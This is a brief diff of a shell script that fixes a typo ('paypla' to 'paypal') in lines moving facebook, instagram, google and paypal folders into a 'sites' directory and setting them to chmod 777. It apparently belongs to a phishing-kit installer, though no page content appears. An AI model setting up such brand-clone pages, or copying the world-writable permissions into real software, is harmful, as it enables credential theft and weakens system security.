@@ -5,7 +5,7 @@ mkdir sites
 mv facebook sites
 mv instagram sites
 mv google sites
-mv paypla sites
+mv paypal sites
 chmod 777 sites/facebook/*
 chmod 777 sites/instagram/*
 chmod 777 sites/google/*
